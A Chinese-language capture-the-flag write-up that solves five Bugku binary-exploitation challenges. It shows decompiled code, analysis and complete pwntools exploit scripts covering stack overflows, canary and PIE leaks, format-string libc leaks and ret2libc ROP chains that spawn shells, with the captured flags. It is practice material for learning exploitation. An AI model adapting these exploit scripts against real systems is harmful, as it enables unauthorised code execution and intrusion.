# Bugku-PWN

## PWN 1

没啥好说直接nc上去cat flag就是了

```shell
syc@ubuntu:~$ nc 114.116.54.89 10001
ls
bin
dev
flag
helloworld
lib
lib32
lib64
cat flag
flag{6979d853add353c9}
```

## PWN 2

先检查一下文件

```shell
syc@ubuntu:/mnt/hgfs/share/Bugku/PWN/pwn2$ checksec pwn2
[*] '/mnt/hgfs/share/Bugku/PWN/pwn2/pwn2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

直接拿IDA Pro打开反汇编一下

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [rsp+0h] [rbp-30h]

  memset(&s, 0, 0x30uLL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  puts("say something?");
  read(0, &s, 0x100uLL);
  puts("oh,that's so boring!");
  return 0;
}
```

可以发现栈只开了0x30的大小，却可以读取0x100个字符，存在明显的栈溢出漏洞，然后发现一个getshell函数

```c
int get_shell_()
{
  puts("tql~tql~tql~tql~tql~tql~tql");
  puts("this is your flag!");
  return system("cat flag");
}
```

很明显只要我们劫持path到这里就完事了，十分容易

接下来直接给exp吧

```python
from pwn import *
#p = process("./pwn2")
p = remote('114.116.54.89 ', 10003)
getshell = 0x400751
payload = "a"*0x38+p64(getshell)
p.recvuntil('say something?\n') 
p.sendline(payload)
print p.recvall()
```

```shell
[*] Closed connection to 114.116.54.89  port 10003
oh,that's so boring!
tql~tql~tql~tql~tql~tql~tql
this is your flag!
flag{n0w_y0u_kn0w_the_Stack0verfl0w}
```

## PWN 3

先检查一下文件

```shell
[*] '/mnt/hgfs/share/Bugku/PWN/pwn3/read_note'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

防护全开，十分厉害的样子，直接拿IDA Pro打开反汇编一下，没有**system**，需要用**libc**构造**shell**，有**canary**保护，需要读**canary**的值，随机地址，需要读程序基址

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  vul();
  return 0;
}
```

```c
void __cdecl vul()
{
  int note_len; // [rsp+4h] [rbp-4ECh]
  FILE *fp; // [rsp+8h] [rbp-4E8h]
  char fpath[20]; // [rsp+10h] [rbp-4E0h]
  char memory[600]; // [rsp+30h] [rbp-4C0h]
  char thinking_note[600]; // [rsp+290h] [rbp-260h]
  unsigned __int64 v5; // [rsp+4E8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  memset(memory, 0, 0x258uLL);
  memset(fpath, 0, 0x14uLL);
  memset(thinking_note, 0, 0x258uLL);
  puts("welcome to noteRead system");
  puts("there is there notebook: flag, flag1, flag2");
  puts("  Please input the note path:");
  read(0, fpath, 0x14uLL);
  if ( fpath[strlen(fpath) - 1] == 10 )
    fpath[strlen(fpath) - 1] = 0;
  if ( strlen(fpath) > 5 )
  {
    puts("note path false!");
  }
  else
  {
    fp = fopen(fpath, "r");
    noteRead(fp, memory, 0x244u);
    puts(memory);
    fclose(fp);
  }
  puts("write some note:");
  puts("  please input the note len:");
  note_len = 0;
  __isoc99_scanf("%d", &note_len);
  puts("please input the note:");
  read(0, thinking_note, (unsigned int)note_len);
  puts("the note is: ");
  puts(thinking_note);
  if ( strlen(thinking_note) != 624 )
  {
    puts("error: the note len must be  624");
    puts("  so please input note(len is 624)");
    read(0, thinking_note, 0x270uLL);
  }
}
```

```c
void __cdecl noteRead(FILE *fp, char *arg_buf, unsigned int arg_len)
{
  int len; // [rsp+2Ch] [rbp-4h]

  fread(arg_buf, arg_len, 1uLL, fp);
  len = strlen(arg_buf);
  if ( arg_buf[len - 1] == 10 )
    arg_buf[len - 1] = 0;
}
```

通过观察，**thinking_note**是存在栈溢出漏洞的，且**notelen**我们可以控制的。利用**thinking_note**进行栈溢出，每次利用第一个**read**和**puts**获取一个值，第二个**read**恢复栈并跳回**main**函数进行下次攻击

```
 memset(thinking_note, 0, 0x258uLL);
 __isoc99_scanf("%d", &note_len);
 read(0, thinking_note, (unsigned int)note_len);
 read(0, thinking_note, 0x270uLL);
```

因为这题存在Canary保护，故第一次肯定为泄露Canary的值，观察下列汇编代码

```c
.text:0000000000000AA0                 push    rbp
.text:0000000000000AA1                 mov     rbp, rsp
.text:0000000000000AA4                 sub     rsp, 4F0h
.text:0000000000000AAB                 mov     rax, fs:28h
.text:0000000000000AB4                 mov     [rbp-8], rax
.text:0000000000000AB8                 xor     eax, eax
```

我们不难得出若要泄露**Canary**地址应构造：**"A" * 0x258**，**Canary**的最低位通常是**0x00**，所以要将其覆盖（**puts**函数遇到**0x00**会停止），故最后应构造： **"A" * 0x258+"B"**

通过查看IDA可知**main**函数的相对地址为**0x0D20**，因为当**vul**函数执行完毕后需要回到**main**函数，故栈中最后的反回地址应该是**0x0D2E**，故第二次将Canary的值写到对应位置，继续覆盖，最低位变为**0x20**，最后的返回地址从**0D2E**变为**0D20**，这样程序就能返回到**main**函数

第二步读取**vul**的返回地址，第一次写栈到**ebp+8**(**canary**要仍要写到**var_8**对应的位置)，读到返回地址，然后减去**0xD2E**(**IDA**中看到的**vul**的返回地址)

第三步读取**libc**基址,**libc**基址根据**main**函数的返回地址计算,**main**函数在**call vul**之前只有**push rbp**会影响栈，而我们在前两步分别多执行了一次**push rbp**，所以一共是执行了**三**次，那么现在**main**函数返回地址的位置应该和**vul**函数返回地址的位置相差**0x8*4**，也就是**ebp+0x28**

故Exp最终如下

```python
from pwn import *

p = remote("114.116.54.89", 10000)

val_add = 0xd2e
pop_rdi_add = 0xe03
puts_plt_add = 0x8b0
puts_got_add = 0x202018
start_add = 0xd20

print p.recvuntil("path:")
p.sendline("flag")
print p.recvuntil("len:")
p.sendline("1000")
payload = "A" * (0x260-8)+"B"
p.send(payload)
print p.recvuntil("B")
canary = u64(p.recv(7).rjust(8,"\x00"))
print "cancay:", hex(canary)
x = p.recvline()

p.recvuntil("(len is 624)\n")
payload = "A" * (0x260-8) 
payload += p64(canary)
payload += p64(0)
payload += "\x20"
p.send(payload)

print p.recvuntil("path:")
p.sendline("flag")
print p.recvuntil("len:")
p.sendline("1000")
payload = "A" * (0x260+7)+"B"
p.send(payload)
print p.recvuntil("B")
x = p.recvline()
val = u64(x[:-1].ljust(8,"\x00"))
print "val:", hex(val)
elf_base = val - val_add
print hex(elf_base)
p.recvuntil("(len is 624)\n")
payload = "A" * (0x260-8) 
payload += p64(canary)
payload += p64(0)
payload += "\x20"
p.send(payload)

puts_plt = elf_base + puts_plt_add
puts_got = elf_base + puts_got_add
pop_rdi = elf_base + pop_rdi_add
start = elf_base + start_add

p.recvuntil("path:")
p.sendline("flag")
p.recvuntil("len:")
p.sendline("1000")
payload = "A" * (0x260 + 8*5-1)+"B" 
p.send(payload)
p.recvuntil("B")
x = p.recvuntil("please")
print x
start_abs = u64(x[:8].split("\n")[0].ljust(8,"\x00"))
libc_base = start_abs - 0x20830
print hex(start_abs)
p.recvuntil("(len is 624)\n")
payload = "A" * (0x260-8) 
payload += p64(canary)
payload += p64(0)
payload += p64(start)
p.send(payload)

bin_add = 0x18cd57
sys_add = 0x45390

bin_abs = libc_base + bin_add
sys_abs = libc_base + sys_add

p.recvuntil("path:")
p.sendline("flag")
p.recvuntil("len:")
p.sendline("1000")
payload = "A" * (0x260-8)
payload += p64(canary)
payload += p64(0)
payload += p64(pop_rdi)
payload += p64(bin_abs)
payload += p64(sys_abs)
payload += p64(start)

p.send(payload)
p.recv()
p.recvuntil("(len is 624)\n")
payload = "A"
p.send(payload)
p.interactive()
```

## PWN 4

先检查一下文件

```shell
[*] '/mnt/hgfs/share/Bugku/PWN/pwn4/pwn4'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

直接拿IDA Pro打开反汇编一下

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char s; // [rsp+0h] [rbp-10h]

  memset(&s, 0, 0x10uLL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  puts("Come on,try to pwn me");
  read(0, &s, 0x30uLL);
  puts("So~sad,you are fail");
  return 0LL;
}
```

存在很明显的栈溢出漏洞

函数虽然调用了**system**，但参数不是**"/bin/sh"**，无法获得**shell**。所以需要我们自己构造**shell**将**"/bin/sh"**作为参数传给**system**函数，然后调用。在**ida**的数据段搜索**"/bin/sh"**,找不到，但是可以找到**“$0”**,也可以得到**shell**

> **$0**在**linux**中为为**shell**或**shell**脚本的名称。**system()**会调用**fork()**产生子进程，由子进程来调用**/bin/sh -c string**来执行参数**string**字符串所代表的命令，此命令执行完后随即返回原调用的进程。所以如果将**$0**作为**system**的参数，能达到传入**'/bin/sh'**一样的效果。

还有要注意的就是64位程序和32位程序的传参方式不一样，32位的函数调用使用栈传参，64位的函数调用使用寄存器传参，分别用**rdi**、**rsi**、**rdx**、**rcx**、**r8**、**r9**来传递参数（参数个数小于7的时候）。

我们利用**ROPgadget**工具进行查找，得到**pop rdi ; ret** 和**$0**的地址,**system**的地址直接在**IDA**中查看

```shell
syc@ubuntu:/mnt/hgfs/share/Bugku/PWN/pwn4$ ROPgadget --binary pwn4 --only 'pop|ret'
Gadgets information
============================================================
0x00000000004007cc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007ce : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007d0 : pop r14 ; pop r15 ; ret
0x00000000004007d2 : pop r15 ; ret
0x00000000004007cb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007cf : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400630 : pop rbp ; ret
0x00000000004007d3 : pop rdi ; ret
0x00000000004007d1 : pop rsi ; pop r15 ; ret
0x00000000004007cd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400541 : ret

Unique gadgets found: 11
```

然后直接开写exp吧

```python
from pwn import *
p = remote('114.116.54.89', 10004)
#p = process('./pwn4')
pop_rdi = 0x00000000004007d3 
bin_sh = 0x000000000060111f
system = 0x000000000040075A
payload = 'A' * (0x10+8) + p64(pop_rdi) + p64(bin_sh) + p64(system)  
p.recvuntil('Come on,try to pwn me')
p.sendline(payload)
p.interactive()
```

```shell
$ ls
bin
dev
flag
lib
lib32
lib64
stack2
$ cat flag
flag{264bc50112318cd6e1a67b0724d6d3af}$  
```

## PWN 5

先检查一下文件

```c
[*] '/mnt/hgfs/share/Bugku/PWN/pwn5/human'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

直接拿IDA Pro打开反汇编一下

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [rsp+0h] [rbp-20h]

  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  memset(&s, 0, 0x20uLL);
  puts(&::s);
  read(0, &s, 8uLL);
  printf(&s, &s);
  puts(&s);
  puts(&s);
  puts(&s);
  puts(&byte_400978);
  sleep(1u);
  puts(asc_400998);
  read(0, &s, 0x40uLL);
  if ( !strstr(&s, &needle) || !strstr(&s, &byte_4009BA) )
  {
    puts(&byte_4009C8);
    exit(0);
  }
  puts(&byte_4009F8);
  return 0;
}
```

首先发现第一次输入存在**printf**函数，存在格式化字符串漏洞，泄露出栈上的**libc_start_main**。**libc_start_main**是**libc**中的函数，可以泄露出加载**libc**的基地址。然后就是找服务器**system**地址和**binsh**地址，通过**gadget**赋值。关键是如何通过字符串泄露出**libc_start_main**的地址，我们通过动态调试来看

首先在printf函数下一个断点，然后运行到此处，查看栈上的情况

```c
pwndbg> stack 50
00:0000│ rdi rsi rsp  0x7fffffffde60 ◂— 0xa61 /* 'a\n' */
01:0008│              0x7fffffffde68 ◂— 0x0
... ↓
04:0020│ rbp          0x7fffffffde80 —▸ 0x4008d0 (__libc_csu_init) ◂— push   r15
05:0028│              0x7fffffffde88 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax
```

```
pwndbg> x/32w $rsp
0x7fffffffde60:	0x24313125	0x00000a70	0x00000000	0x00000000
0x7fffffffde70:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffde80:	0x004008d0	0x00000000	0xf7a2d830	0x00007fff
0x7fffffffde90:	0xffffdf68	0x00007fff	0xffffdf68	0x00007fff
0x7fffffffdea0:	0xf7b99608	0x00000001	0x00400796	0x00000000
0x7fffffffdeb0:	0x00000000	0x00000000	0x603a5ce0	0xa87e90b7
0x7fffffffdec0:	0x004006a0	0x00000000	0xffffdf60	0x00007fff
0x7fffffffded0:	0x00000000	0x00000000	0x00000000	0x00000000
```

可以看到在栈上第11个位置存在**libc_start_main+240**,即**libc_start_main_ret**的地址，把**libc**文件放在**ida**中，找到**_libc_start_main**函数中调用**main**函数的地方，查看地址。这个**main**的返回地址就=**libc**基址+**0x2082E**(这个**call rax**的偏移地址) + **2**(**call rax**的长度为2)，**libc**的**system**函数偏移地址**0x45390**，**"/bin/sh"**字符串偏移地址**0x18cd57**，**human**的**pop_rdi_ret**地址**0x400933**，**libc**中函数的实际地址=**libc**基址 + 函数偏移地址

然后变量**s**存在溢出，且要避免执行**exit()**;查看**if**中比较的两个字符串，一个是“**真香**”，一个是“**鸽子**”，也就是说输入字符串**s**中要同时存在这两个词。

故可写Exp

```python
from pwn import *
p = remote("114.116.54.89", "10005")
#p = process("./human")
pop_rdi = 0x400933
bin_add = 0x18cd57
sys_add = 0x45390
gezi = "鸽子"
zhenxiang = "真香"
print p.recvuntil("?\n")
p.sendline("%11$p.")
print p.recvline()
libc_leak = int(p.recvline()[2:-2],16)
libc_base = libc_leak - 0x20830
print p.recvuntil("还有什么本质?")
bin_abs = libc_base + bin_add
sys_abs = libc_base + sys_add
payload = (gezi+zhenxiang).ljust(0x20+8,"A")
payload += p64(pop_rdi)
payload += p64(bin_abs)
payload += p64(sys_abs)
p.sendline(payload)
p.interactive()
```

